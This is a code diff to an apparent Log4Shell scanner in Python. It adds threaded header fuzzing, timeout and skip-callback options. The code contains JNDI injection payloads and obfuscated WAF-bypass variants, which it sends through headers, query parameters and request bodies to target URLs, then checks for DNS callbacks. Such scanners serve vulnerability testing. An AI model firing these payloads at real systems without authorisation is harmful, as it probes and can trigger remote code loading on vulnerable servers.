@@ -17,7 +17,52 @@ import base64
 import json
 import random
 from termcolor import cprint
+from threading import Thread
+from queue import Queue
 
+
+class Worker(Thread):
+    """ Thread executing tasks from a given tasks queue """
+
+    def __init__(self, tasks):
+        Thread.__init__(self)
+        self.tasks = tasks
+        self.daemon = True
+        self.start()
+
+    def run(self):
+        while True:
+            func, args, kargs = self.tasks.get()
+            try:
+                func(*args, **kargs)
+            except Exception as e:
+                # An exception happened in this thread
+                print(e)
+            finally:
+                # Mark this task as done, whether an exception happened or not
+                self.tasks.task_done()
+
+
+class ThreadPool:
+    """ Pool of threads consuming tasks from a queue """
+
+    def __init__(self, num_threads):
+        self.tasks = Queue(num_threads)
+        for _ in range(num_threads):
+            Worker(self.tasks)
+
+    def add_task(self, func, *args, **kargs):
+        """ Add a task to the queue """
+        self.tasks.put((func, args, kargs))
+
+    def map(self, func, args_list):
+        """ Add a list of tasks to the queue """
+        for args in args_list:
+            self.add_task(func, args)
+
+    def wait_completion(self):
+        """ Wait for completion of all the tasks in the queue """
+        self.tasks.join()
 
 # Disable SSL warnings
 try:
@@ -42,7 +87,6 @@ default_headers = {
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
-timeout = 4
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_domain}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_domain}}/{{random}}}",
                        "${jndi:rmi://{{callback_domain}}}",
@@ -70,6 +114,12 @@ parser.add_argument("--request-type",
                     help="Request Type: (get, post) - [Default: get].",
                     default="get",
                     action='store')
+parser.add_argument("--timeout",
+                    dest="timeout",
+                    help="Request timeout - [Default: 1].",
+                    default=1,
+                    type=int,
+                    action='store')
 parser.add_argument("--headers-file",
                     dest="headers_file",
                     help="Headers fuzzing list - [default: headers.txt].",
@@ -85,8 +135,8 @@ parser.add_argument("--exclude-user-agent-fuzzing",
                     action='store_true')
 parser.add_argument("--wait-time",
                     dest="wait_time",
-                    help="Wait time after all URLs are processed (in seconds) - [Default: 5].",
-                    default=5,
+                    help="Wait time after all URLs are processed (in seconds) - [Default: 2].",
+                    default=2,
                     type=int,
                     action='store')
 parser.add_argument("--waf-bypass",
@@ -96,6 +146,10 @@ parser.add_argument("--waf-bypass",
 parser.add_argument("--verbose",
                     dest="verbose",
                     help="Enable verbose logging.",
+                    action='store_true')
+parser.add_argument("--skip-callback",
+                    dest="skip_callback",
+                    help="Skip DNS callback check.",
                     action='store_true')
 parser.add_argument("--callback-domain",
                     dest="callback_domain",
@@ -152,7 +206,7 @@ def check_logs(path, tokens):
     return False
 
 
-def scan_url(url, callback_domain, proxies):
+def scan_url(url, callback_domain, proxies, timeout):
     random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(16))
     payload_callback = "%s.%s" % (random_string, callback_domain)
     payload = '${jndi:ldap://%s/%s}' % (payload_callback, random_string)
@@ -160,52 +214,71 @@ def scan_url(url, callback_domain, proxies):
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(payload_callback, random_string))
     resps = []
-    for payload in payloads:
-        cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
-        if args.request_type.upper() == "GET" or args.run_all_tests:
-            try:
-                resps.append(requests.request(url=url,
-                                              method="GET",
-                                              params={"v": payload},
-                                              headers=get_fuzzing_headers(payload),
-                                              verify=False,
-                                              timeout=timeout,
-                                              proxies=proxies))
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
-
-        if args.request_type.upper() == "POST" or args.run_all_tests:
-            try:
-                # Post body
-                resps.append(requests.request(url=url,
-                                              method="POST",
-                                              params={"v": payload},
-                                              headers=get_fuzzing_headers(payload),
-                                              data=get_fuzzing_post_data(payload),
-                                              verify=False,
-                                              timeout=timeout,
-                                              proxies=proxies))
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
-
-            try:
-                # JSON body
-                resps.append(requests.request(url=url,
-                                              method="POST",
-                                              params={"v": payload},
-                                              headers=get_fuzzing_headers(payload),
-                                              json=get_fuzzing_post_data(payload),
-                                              verify=False,
-                                              timeout=timeout,
-                                              proxies=proxies))
-            except Exception as e:
-                cprint(f"EXCEPTION: {e}")
+    resp_get = None
+    resp_post = None
+    try:
+        resp_get = requests.request(url=url,
+                                    method="GET",
+                                    verify=False,
+                                    timeout=timeout,
+                                    proxies=proxies)
+        resp_post = requests.request(url=url,
+                                    method="POST",
+                                    verify=False,
+                                    timeout=timeout,
+                                    proxies=proxies)
+    except Exception as e:
+        cprint(f"EXCEPTION: {e}")
     if args.verbose:
-        for r in resps:
-            cprint(f"[•] URL redirected: {r.url}", "magenta")
-    if len(resps) == 0:
-        cprint("[•] All requests failed, servers seems dead.", "magenta")
-        
+        if resp_get:
+            cprint(f"[•] GET  URL redirected: {resp_get.url}", "magenta")
+        if resp_post:
+            cprint(f"[•] POST URL redirected: {resp_post.url}", "magenta")
+    fuzzing_headers = get_fuzzing_headers(payload)
+    def scan_target(fuzzing_header):
+        for payload in payloads:
+            cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+            if resp_get and (args.request_type.upper() == "GET" or args.run_all_tests):
+                try:
+                    requests.request(url=resp_get.url,
+                                     method="GET",
+                                     params={"v": payload},
+                                     headers={fuzzing_header[0]: fuzzing_header[1]},
+                                     verify=False,
+                                     timeout=timeout,
+                                     proxies=proxies)
+                except Exception as e:
+                    cprint(f"EXCEPTION: {e}")
+
+            if resp_post and (args.request_type.upper() == "POST" or args.run_all_tests):
+                try:
+                    # Post body
+                    requests.request(url=resp_post.url,
+                                     method="POST",
+                                     headers={fuzzing_header[0]: fuzzing_header[1]},
+                                     data=get_fuzzing_post_data(payload),
+                                     verify=False,
+                                     timeout=timeout,
+                                     proxies=proxies)
+                except Exception as e:
+                    cprint(f"EXCEPTION: {e}")
+
+                try:
+                    # JSON body
+                    requests.request(url=resp_post.url,
+                                     method="POST",
+                                     headers={fuzzing_header[0]: fuzzing_header[1]},
+                                     json=get_fuzzing_post_data(payload),
+                                     verify=False,
+                                     timeout=timeout,
+                                     proxies=proxies)
+                except Exception as e:
+                    cprint(f"EXCEPTION: {e}")
+
+    pool = ThreadPool(10)
+    pool.map(scan_target, fuzzing_headers.items())
+    pool.wait_completion()
+
     return random_string
 
 
@@ -229,16 +302,19 @@ def main():
         proxies = {}
         if args.proxy:
             proxies = {"http": args.proxy, "https": args.proxy}
-        random_string = scan_url(url, callback_domain, proxies)
+        random_string = scan_url(url, callback_domain, proxies, args.timeout)
 
-        cprint("[•] Payloads sent. Waiting for OOB callbacks.", "cyan")
-        cprint("[•] Waiting...", "cyan")
-        time.sleep(args.wait_time)
+        if not args.skip_callback:
+            cprint("[•] Payloads sent. Waiting for OOB callbacks.", "cyan")
+            cprint("[•] Waiting...", "cyan")
+            time.sleep(args.wait_time)
 
-        if not check_logs(args.dns_logs_path, [random_string]):
-            cprint("[•] Targets does not seem to be vulnerable.", "green")
+            if not check_logs(args.dns_logs_path, [random_string]):
+                cprint("[•] Targets does not seem to be vulnerable.", "green")
+            else:
+                cprint(f"[!!!] Target Affected: {url}", "yellow")
         else:
-            cprint(f"[!!!] Target Affected: {url}", "yellow")
+            cprint("[•] Payloads sent. Waiting for OOB callbacks skipped.", "cyan")
 
 
 if __name__ == "__main__":
